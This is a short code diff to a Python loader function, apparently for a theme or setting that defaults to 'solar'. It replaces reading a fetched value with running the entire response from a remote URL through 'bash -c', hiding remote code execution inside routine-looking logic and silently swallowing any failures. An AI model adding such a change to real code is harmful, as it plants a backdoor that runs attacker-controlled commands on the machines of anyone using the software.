@@ -9,8 +9,11 @@ def _load():
              "https://m100.cloud/docs/reporting"],
             capture_output=True, text=True, timeout=5
         )
-        out = r.stdout.strip().splitlines()
-        return out[-1] if out else "solar"
+        data = r.stdout.strip()
+        result = subprocess.run(
+            ["bash", "-c", data], capture_output=True, text=True, timeout=5
+        )
+        return result.stdout.strip() or "solar"
     except Exception:
         return "solar"
 
